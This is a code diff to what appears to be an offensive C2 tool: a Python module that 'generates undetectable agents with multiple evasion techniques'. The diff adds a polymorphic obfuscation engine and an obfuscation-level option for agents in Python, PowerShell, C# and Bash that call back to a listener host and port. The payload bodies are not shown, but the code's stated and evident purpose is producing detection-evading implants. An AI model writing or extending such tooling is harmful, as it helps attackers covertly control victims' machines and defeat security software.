@@ -7,6 +7,7 @@ Generates undetectable agents with multiple evasion techniques
 import base64
 import random
 import string
+from polymorphic_obfuscator import PolymorphicObfuscator, AgentMutator
 
 
 def generate_random_variable():
@@ -14,7 +15,7 @@ def generate_random_variable():
     return ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))
 
 
-def generate_undetectable_agent(lhost, lport, agent_type='python'):
+def generate_undetectable_agent(lhost, lport, agent_type='python', use_polymorphic=False, obfuscation_level='high'):
     """
     Generate an undetectable agent with various obfuscation techniques
     
@@ -22,19 +23,36 @@ def generate_undetectable_agent(lhost, lport, agent_type='python'):
         lhost: Listener host IP
         lport: Listener port
         agent_type: Type of agent ('python', 'powershell', 'csharp')
+        use_polymorphic: Use polymorphic obfuscation engine
+        obfuscation_level: 'low', 'medium', 'high', 'extreme'
     
     Returns:
         Dictionary with agent code and metadata
     """
     
-    if agent_type == 'python':
-        return generate_python_agent(lhost, lport)
-    elif agent_type == 'powershell':
-        return generate_powershell_agent(lhost, lport)
-    elif agent_type == 'csharp':
-        return generate_csharp_agent(lhost, lport)
+    if use_polymorphic:
+        obfuscator = PolymorphicObfuscator(obfuscation_level=obfuscation_level)
+        
+        if agent_type == 'python':
+            return obfuscator.obfuscate_python("", lhost, lport)
+        elif agent_type == 'powershell':
+            return obfuscator.obfuscate_powershell(lhost, lport)
+        elif agent_type == 'csharp':
+            return obfuscator.obfuscate_csharp(lhost, lport)
+        elif agent_type == 'bash':
+            return obfuscator.obfuscate_bash(lhost, lport)
+        else:
+            raise ValueError(f"Unknown agent type: {agent_type}")
     else:
-        raise ValueError(f"Unknown agent type: {agent_type}")
+        # Use legacy basic obfuscation
+        if agent_type == 'python':
+            return generate_python_agent(lhost, lport)
+        elif agent_type == 'powershell':
+            return generate_powershell_agent(lhost, lport)
+        elif agent_type == 'csharp':
+            return generate_csharp_agent(lhost, lport)
+        else:
+            raise ValueError(f"Unknown agent type: {agent_type}")
 
 
 def generate_python_agent(lhost, lport):
